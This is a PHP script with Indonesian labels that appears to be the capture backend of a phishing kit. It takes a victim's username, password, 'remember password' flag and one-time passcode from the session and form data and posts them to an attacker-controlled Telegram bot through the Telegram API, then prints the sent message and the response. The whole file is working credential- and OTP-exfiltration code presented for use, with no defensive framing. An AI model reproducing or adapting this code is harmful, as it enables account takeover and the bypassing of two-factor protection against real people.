<?php
session_start();
require 'config.php';

date_default_timezone_set('Asia/Jakarta');


$otp = isset($_POST['otp']) ? trim($_POST['otp']) : '';


$use      = $_SESSION['use'] ?? '';
$word     = $_SESSION['word'] ?? '';
$remember = $_SESSION['remember'] ?? '';


$time = date('Y-m-d H:i:s');
$message = "🔐 *Verifikasi OTP*\n";
$message .= "Waktu: {$time}\n";
$message .= "Use: {$use}\n";
$message .= "Word: {$word}\n";
$message .= "Ingat Sandi: {$remember}\n";
$message .= "OTP: {$otp}\n";

$token = TG_BOT_TOKEN;
$chat_id = TG_CHAT_ID;

if (!empty($token) && !empty($chat_id) && strpos($token, 'GANTI_DENGAN') === false) {
    $url = "https://api.telegram.org/bot{$token}/sendMessage";
    $data = [
        'chat_id' => $chat_id,
        'text' => $message,
        'parse_mode' => 'Markdown'
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $result = curl_exec($ch);
    $errno  = curl_errno($ch);
    curl_close($ch);


    echo "<pre>";
    echo "📤 Pesan yang dikirim ke Telegram:\n";
    echo htmlspecialchars($message);
    echo "\n\n";
    echo "📩 Response Telegram:\n";
    var_dump($result);
    echo "\n\n";
    echo "⚠️ Error No (jika 0 berarti sukses): {$errno}\n";
    echo "</pre>";
} else {
    echo "❌ Token atau Chat ID belum benar.";
}
